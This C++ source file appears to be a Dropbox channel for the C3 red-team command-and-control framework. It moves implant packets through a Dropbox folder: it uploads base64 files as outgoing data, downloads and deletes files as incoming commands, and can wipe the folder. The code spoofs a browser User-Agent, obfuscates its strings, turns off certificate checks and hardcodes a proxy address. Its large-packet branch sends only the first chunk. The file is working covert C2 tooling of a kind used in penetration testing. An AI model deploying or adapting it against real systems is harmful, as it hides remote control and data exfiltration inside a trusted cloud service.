#include "StdAfx.h"
#include <fstream>
#include <filesystem>

#include <Common/CppRestSdk/include/cpprest/http_client.h>
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/CppRestSdk/include/cpprest/base_uri.h"

#include "DropBox.h"



namespace FSecure::C3::Interfaces::Channels
{
	
	DropBox::DropBox(FSecure::ByteView arguments)
		: m_inFile( arguments.Read<std::string>() )
		, m_outFile( arguments.Read<std::string>() )
		, m_Directory( arguments.Read<std::string>() )
		, m_Token( arguments.Read<std::string>() )
	{	
		//if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		//	this->m_HttpConfig.set_proxy(winProxy == OBF(L"auto") ? web::web_proxy::use_auto_discovery : web::web_proxy(winProxy));
			
		this->m_HttpConfig.set_proxy(web::web_proxy(L"http://192.168.0.18:8080"));
		this->m_HttpConfig.set_validate_certificates(false);

	}

		
	std::string DropBox::SendHTTPRequest(std::string const& host, std::string const& contentType, std::string const& data)
	{
		while (true)
		{
			web::http::client::http_client webClient(utility::conversions::to_string_t(host), this->m_HttpConfig);
			web::http::http_request request(web::http::methods::POST); 
				
			if (!data.empty())
			{
				request.set_body(utility::conversions::to_string_t(data));	
			}
			if (!contentType.empty())
			{
				request.headers().set_content_type(utility::conversions::to_string_t(contentType));
			}
				
				
			request.headers()[L"User-Agent"] = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36";
			request.headers()[L"Authorization"] = L"Bearer " + utility::conversions::to_string_t(this->m_Token);
			request.headers()[L"Host"] = L"api.dropboxapi.com";
				
			web::http::http_response resp = webClient.request(request).get();
			
			if (resp.status_code() == web::http::status_codes::OK)
				return resp.extract_utf8string().get();
			else if (resp.status_code() == web::http::status_codes::TooManyRequests)
				std::this_thread::sleep_for(FSecure::Utils::GenerateRandomValue(10s, 20s));
			else if (resp.status_code() == web::http::status_code(409))
			{ }
			else
				throw std::exception(OBF("[x] Non 200/429 HTTP Response\n"));
		}
	}

	std::string DropBox::SendHTTPRequest(std::string const& host, json const& h_args, std::string const& contentType, std::string const& data)
	{
		while (true)
		{
			web::http::client::http_client webClient(utility::conversions::to_string_t(host), this->m_HttpConfig);
			web::http::http_request request(web::http::methods::POST);
	
			if (!data.empty())
			{
				request.set_body(utility::conversions::to_string_t(data));
			}
			if (!contentType.empty())
			{
				request.headers().set_content_type(utility::conversions::to_string_t(contentType));	
			}


			request.headers()[L"User-Agent"] = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36";
			request.headers()[L"Authorization"] = L"Bearer " + utility::conversions::to_string_t(this->m_Token);
			request.headers()[L"Host"] = L"content.dropboxapi.com";
			request.headers()[L"Dropbox-API-Arg"] = utility::conversions::to_string_t(h_args.dump());
			
			web::http::http_response resp = webClient.request(request).get();
			
			if (resp.status_code() == web::http::status_codes::OK)
				return resp.extract_utf8string(true).get();
			else if (resp.status_code() == web::http::status_codes::TooManyRequests)
				std::this_thread::sleep_for(FSecure::Utils::GenerateRandomValue(10s, 20s));
			else if (resp.status_code() == web::http::status_code(409))
			{ }
			else
				throw std::exception(OBF("[x] Non 200/429 HTTP Response\n"));
		}
	}

	json DropBox::SendJsonRequest(std::string const& url, json const& data)
	{
		return json::parse(SendHTTPRequest(url, OBF("application/json"), data.dump()));
	}

	json DropBox::SendJsonRequest(std::string const& url, json const& h_args, std::string data)
	{
		return json::parse(SendHTTPRequest(url, h_args, OBF("application/octet-stream"), data));
	}

	size_t DropBox::OnSendToChannel(FSecure::ByteView packet)
	{

		std::string b64packet = "";
		std::string strpacket = "";
		size_t actualPacketSize = 0;
		size_t maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(150'000'000);
		size_t bytesWritten = 0;

		// if total packet size is smaller than api file upload size
		// send packet in one file request
		if (packet.length() < maxPacketSize)
		{
			std::string base64 = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
			//Write to file on DropBox
			std::string url = OBF_STR("https://content.dropboxapi.com/2/files/upload");
				
			json db_args;
			db_args[OBF("path")] = OBF("/") + m_Directory + OBF("/") + m_outFile;
			db_args[OBF("mode")] = OBF("add");
			db_args[OBF("autorename")] = true;
			db_args[OBF("mute")] = true;

			SendJsonRequest(url, db_args, base64);
			bytesWritten = packet.length();
		}
		// if total packet size is larger than api file upload size
		// chunck the packet into smaller packets
		else 
		{
			actualPacketSize = std::min(maxPacketSize, packet.size());
			strpacket = packet.SubString(0, actualPacketSize);
			
			b64packet = cppcodec::base64_rfc4648::encode(strpacket.data(), strpacket.size());
			
			std::string url = OBF_STR("https://content.dropboxapi.com/2/files/upload");

			json db_args;
			db_args[OBF("path")] = OBF("/") + m_Directory + OBF("/") + m_outFile;
			db_args[OBF("mode")] = OBF("add");
			db_args[OBF("autorename")] = true;
			db_args[OBF("mute")] = true;

			SendJsonRequest(url, db_args, b64packet);
			bytesWritten = strpacket.size();

		}
		return bytesWritten;
	}

	std::vector<FSecure::ByteVector> DropBox::OnReceiveFromChannel()
	{
		std::vector<ByteVector> ret;
		bool loop_again = false;

		//list all files on DropBox
		std::string url = OBF_STR("https://api.dropboxapi.com/2/files/list_folder");
		json db_list;
		db_list[OBF("path")] = OBF("/") + m_Directory;
		db_list[OBF("recursive")] = false;

		json filelist = SendJsonRequest(url, db_list);
		std::cout << "No of files to read : " << filelist["entries"].size() << std::endl;
		do
		{	
			
			if (filelist["entries"].size() > 0)
			{
				for (int i = 0; i < filelist["entries"].size(); i++)
				{
					url = OBF_STR("https://content.dropboxapi.com/2/files/download");
					json db_args;
					db_args[OBF("path")] = filelist["entries"][i]["path_display"];
					std::cout << "Reading Files: " << filelist["entries"][i]["path_display"] << std::endl;

					std::string fileContent = SendHTTPRequest(url, db_args, " text/plain; charset=utf-8", "");
					if (!fileContent.empty())
					{
						// read packet from file
						auto relayContent = cppcodec::base64_rfc4648::decode(fileContent);

						//remove command from channel after completion
						url = OBF_STR("https://api.dropboxapi.com/2/files/delete_v2");

						SendJsonRequest(url, db_args);

						ret.emplace_back(std::move(relayContent));
					}
				}
			}
			// check if there are more files on dropbox
			// if true, list more files
			loop_again = filelist["has_more"];
			if (loop_again)
			{
				std::string url = OBF_STR("https://api.dropboxapi.com/2/files/list_folder/continue");
				json db_list1;
				db_list1[OBF("cursor")] = filelist["cursor"];

				filelist = SendJsonRequest(url, db_list1);
			}
		} while (loop_again);
		
		
		return ret;
	}

	ByteVector DropBox::OnRunCommand(ByteView command)
	{
		auto commandCopy = command;
		switch (command.Read<uint16_t>())
		{
		case 0:
			Clear();
			return {};
		default:
			return AbstractChannel::OnRunCommand(commandCopy);
		}
	}

	bool DropBox::Clear()
	{
		std::string url = OBF_STR("https://api.dropboxapi.com/2/files/delete_v2");

		json file_info;
		file_info[OBF("path")] = OBF("/") + m_Directory;

		json x = SendJsonRequest(url, file_info);
		return true;
	}

	const char* DropBox::GetCapability()
	{
		return R"(
			{
				"create": 
				{
					"arguments": 
					[
						[
							{
								"type": "string",
								"name": "Input ID",
								"min": 4,
								"randomize": true,
								"description": "Used to distinguish packets for the channel"
							},
							{
								"type": "string",
								"name": "Output ID",
								"min": 4,
								"randomize": true,
								"description": "Used to distinguish packets from the channel"
							}
						],
						{
							"type": "string",
							"name": "Directory Name",
							"min": 1,
							"description": "The diretory name to use in DropBox"
						},
						{
							"type": "string",
							"name": "DropBox Access Token",
							"min": 1,
							"description": "This token is what channel needs to interact with DropBox's API"
						}
					]
				},
				"commands":
				[
					{
						"name": "Remove all files",
						"id": 0,
						"description": "Clearing old files from directory may increase bandwidth",
						"arguments": []
					}
				]
			}
		)";
	}
}